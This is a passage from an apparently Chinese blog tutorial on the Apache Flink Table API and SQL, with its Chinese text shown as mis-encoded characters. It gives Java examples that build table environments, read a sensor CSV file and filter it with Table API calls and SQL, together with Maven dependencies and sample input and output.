 String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. åˆ›å»ºè¡¨ç¯å¢ƒ</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åŸºäºæµåˆ›å»ºä¸€å¼ è¡¨</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. è°ƒç”¨table APIè¿›è¡Œè½¬æ¢æ“ä½œ</span></span><br><span class="line">    Table resultTable = dataTable.select(<span class="string">&quot;id, temperature&quot;</span>)</span><br><span class="line">      .where(<span class="string">&quot;id = &#x27;sensor_1&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. æ‰§è¡ŒSQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line">    String sql = <span class="string">&quot;select id, temperature from sensor where id = &#x27;sensor_1&#x27;&quot;</span>;</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(sql);</span><br><span class="line"></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> Txtæ–‡ä»¶  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºç»“æœ  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,35.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,35.8</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,36.3</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,36.3</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,32.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,32.8</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,37.1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,37.1</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="åŸºæœ¬ç¨‹åºç»“æ„"><a href="#åŸºæœ¬ç¨‹åºç»“æ„" class="headerlink" title="åŸºæœ¬ç¨‹åºç»“æ„"></a>åŸºæœ¬ç¨‹åºç»“æ„</h4><ul><li> Table APIå’ŒSQLçš„ç¨‹åºç»“æ„ï¼Œä¸æµå¼å¤„ç†çš„ç¨‹åºç»“æ„ååˆ†ç±»ä¼¼  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StreamTableEnvironment tableEnv = ... <span class="comment">// åˆ›å»ºè¡¨çš„æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€å¼ è¡¨ï¼Œç”¨äºè¯»å–æ•°æ®</span></span><br><span class="line">tableEnv.connect(...).createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œä¸€å¼ è¡¨ï¼Œç”¨äºæŠŠè®¡ç®—ç»“æœè¾“å‡º</span></span><br><span class="line">tableEnv.connect(...).createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡ Table API æŸ¥è¯¢ç®—å­ï¼Œå¾—åˆ°ä¸€å¼ ç»“æœè¡¨</span></span><br><span class="line">Table result = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>).select(...);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡SQLæŸ¥è¯¢è¯­å¥ï¼Œå¾—åˆ°ä¸€å¼ ç»“æœè¡¨</span></span><br><span class="line">Table sqlResult = tableEnv.sqlQuery(<span class="string">&quot;SELECT ... FROM inputTable ...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ç»“æœè¡¨å†™å…¥è¾“å‡ºè¡¨ä¸­</span></span><br><span class="line">result.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="Table-APIæ‰¹å¤„ç†å’Œæµå¤„ç†"><a href="#Table-APIæ‰¹å¤„ç†å’Œæµå¤„ç†" class="headerlink" title="Table APIæ‰¹å¤„ç†å’Œæµå¤„ç†"></a>Table APIæ‰¹å¤„ç†å’Œæµå¤„ç†</h4><p>æ–°ç‰ˆæœ¬blinkï¼ŒçœŸæ­£æŠŠæ‰¹å¤„ç†ã€æµå¤„ç†éƒ½ä»¥DataStreamå®ç°ã€‚</p><h5 id="åˆ›å»ºç¯å¢ƒ-æ ·ä¾‹ä»£ç "><a href="#åˆ›å»ºç¯å¢ƒ-æ ·ä¾‹ä»£ç " class="headerlink" title="åˆ›å»ºç¯å¢ƒ-æ ·ä¾‹ä»£ç "></a>åˆ›å»ºç¯å¢ƒ-æ ·ä¾‹ä»£ç </h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.ExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.EnvironmentSettings;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.TableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.BatchTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.internal.TableEnvironmentImpl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.1 åŸºäºè€ç‰ˆæœ¬plannerçš„æµå¤„ç†</span></span><br><span class="line">    EnvironmentSettings oldStreamSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useOldPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment oldStreamTableEnv = StreamTableEnvironment.create(env,oldStreamSettings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.2 åŸºäºè€ç‰ˆæœ¬plannerçš„æ‰¹å¤„ç†</span></span><br><span class="line">    ExecutionEnvironment batchEnv = ExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    BatchTableEnvironment oldBatchTableEnv = BatchTableEnvironment.create(batchEnv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.3 åŸºäºBlinkçš„æµå¤„ç†</span></span><br><span class="line">    EnvironmentSettings blinkStreamSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment blinkStreamTableEnv = StreamTableEnvironment.create(env,blinkStreamSettings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.4 åŸºäºBlinkçš„æ‰¹å¤„ç†</span></span><br><span class="line">    EnvironmentSettings blinkBatchSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inBatchMode()</span><br><span class="line">      .build();</span><br><span class="line">    TableEnvironment blinkBatchTableEnv = TableEnvironment.create(blinkBatchSettings);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="è¡¨-Table"><a href="#è¡¨-Table" class="headerlink" title="è¡¨(Table)"></a>è¡¨(Table)</h5><ul><li>TableEnvironmentå¯ä»¥æ³¨å†Œç›®å½•Catalogï¼Œå¹¶å¯ä»¥åŸºäºCatalogæ³¨å†Œè¡¨</li><li><strong>è¡¨(Table)æ˜¯ç”±ä¸€ä¸ªâ€æ ‡ç¤ºç¬¦â€(identifier)æ¥æŒ‡å®šçš„ï¼Œç”±3éƒ¨åˆ†ç»„æˆï¼šCatalogåã€æ•°æ®åº“(database)åå’Œå¯¹è±¡å</strong></li><li>è¡¨å¯ä»¥æ˜¯å¸¸è§„çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯è™šæ‹Ÿçš„(è§†å›¾ï¼ŒView)</li><li>å¸¸è§„è¡¨(Table)ä¸€èˆ¬å¯ä»¥ç”¨æ¥æè¿°å¤–éƒ¨æ•°æ®ï¼Œæ¯”å¦‚æ–‡ä»¶ã€æ•°æ®åº“è¡¨æˆ–æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä»DataStreamè½¬æ¢è€Œæ¥</li><li>è§†å›¾(View)å¯ä»¥ä»ç°æœ‰çš„è¡¨ä¸­åˆ›å»ºï¼Œé€šå¸¸æ˜¯table APIæˆ–è€…SQLæŸ¥è¯¢çš„ä¸€ä¸ªç»“æœé›†</li></ul><h5 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h5><ul><li> TableEnvironmentå¯ä»¥è°ƒç”¨<code>connect()</code>æ–¹æ³•ï¼Œè¿æ¥å¤–éƒ¨ç³»ç»Ÿï¼Œå¹¶è°ƒç”¨<code>.createTemporaryTable()</code>æ–¹æ³•ï¼Œåœ¨Catalogä¸­æ³¨å†Œè¡¨  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tableEnv</span><br><span class="line">  .connect(...)<span class="comment">//å®šä¹‰è¡¨çš„æ•°æ®æ¥æºï¼Œå’Œå¤–éƒ¨ç³»ç»Ÿå»ºç«‹è¿æ¥</span></span><br><span class="line">  .withFormat(...)<span class="comment">//å®šä¹‰æ•°æ®æ ¼å¼åŒ–æ–¹æ³•</span></span><br><span class="line">  .withSchema(...)<span class="comment">//å®šä¹‰è¡¨ç»“æ„</span></span><br><span class="line">  .createTemporaryTable(<span class="string">&quot;MyTable&quot;</span>);<span class="comment">//åˆ›å»ºä¸´æ—¶è¡¨</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="åˆ›å»ºTableEnvironment"><a href="#åˆ›å»ºTableEnvironment" class="headerlink" title="åˆ›å»ºTableEnvironment"></a>åˆ›å»ºTableEnvironment</h5><ul><li> åˆ›å»ºè¡¨çš„æ‰§è¡Œç¯å¢ƒï¼Œéœ€è¦å°†flinkæµå¤„ç†çš„æ‰§è¡Œç¯å¢ƒä¼ å…¥<br><code>StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</code> </li><li>TableEnvironmentæ˜¯flinkä¸­é›†æˆTable APIå’ŒSQLçš„æ ¸å¿ƒæ¦‚å¿µï¼Œæ‰€æœ‰å¯¹è¡¨çš„æ“ä½œéƒ½åŸºäºTableEnvironment <ul><li>æ³¨å†ŒCatalog</li><li>åœ¨Catalogä¸­æ³¨å†Œè¡¨</li><li>æ‰§è¡ŒSQLæŸ¥è¯¢</li><li>æ³¨å†Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰</li></ul></li></ul><h6 id="æµ‹è¯•ä»£ç -6"><a href="#æµ‹è¯•ä»£ç -6" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><ul><li><p> pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Table API å’Œ Flink SQL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-planner-blink_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- csv --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-csv<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¡¨çš„åˆ›å»ºï¼šè¿æ¥å¤–éƒ¨ç³»ç»Ÿï¼Œè¯»å–æ•°æ®</span></span><br><span class="line">    <span class="comment">// 2.1 è¯»å–æ–‡ä»¶</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath)) <span class="comment">// å®šä¹‰åˆ°æ–‡ä»¶ç³»ç»Ÿçš„è¿æ¥</span></span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv()) <span class="comment">// å®šä¹‰ä»¥csvæ ¼å¼è¿›è¡Œæ•°æ®æ ¼å¼åŒ–</span></span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 ) <span class="comment">// å®šä¹‰è¡¨ç»“æ„</span></span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>); <span class="comment">// åˆ›å»ºä¸´æ—¶è¡¨</span></span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    inputTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(inputTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å…¥æ–‡ä»¶  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- timestamp: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> </span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li></ul><h5 id="è¡¨çš„æŸ¥è¯¢"><a href="#è¡¨çš„æŸ¥è¯¢" class="headerlink" title="è¡¨çš„æŸ¥è¯¢"></a>è¡¨çš„æŸ¥è¯¢</h5><ul><li> Table APIæ˜¯é›†æˆåœ¨Scalaå’ŒJavaè¯­è¨€å†…çš„æŸ¥è¯¢API </li><li> Table APIåŸºäºä»£è¡¨â€è¡¨â€çš„Tableç±»ï¼Œå¹¶æä¾›ä¸€æ•´å¥—æ“ä½œå¤„ç†çš„æ–¹æ³•APIï¼›è¿™äº›æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªæ–°çš„Tableå¯¹è±¡ï¼Œè¡¨ç¤ºå¯¹è¾“å…¥è¡¨åº”ç”¨è½¬æ¢æ“ä½œçš„ç»“æœ </li><li> æœ‰äº›å…³ç³»å‹è½¬æ¢æ“ä½œï¼Œå¯ä»¥ç”±å¤šä¸ªæ–¹æ³•è°ƒç”¨ç»„æˆï¼Œæ„æˆé“¾å¼è°ƒç”¨ç»“æ„  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Table sensorTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">Table resultTable = sensorTable</span><br><span class="line">  .select(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;temperature&quot;</span>)</span><br><span class="line">  .filter(<span class="string">&quot;id = &#x27;sensor_1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»æ–‡ä»¶è·å–æ•°æ®"><a href="#ä»æ–‡ä»¶è·å–æ•°æ®" class="headerlink" title="ä»æ–‡ä»¶è·å–æ•°æ®"></a>ä»æ–‡ä»¶è·å–æ•°æ®</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¡¨çš„åˆ›å»ºï¼šè¿æ¥å¤–éƒ¨ç³»ç»Ÿï¼Œè¯»å–æ•°æ®</span></span><br><span class="line">    <span class="comment">// 2.1 è¯»å–æ–‡ä»¶</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span 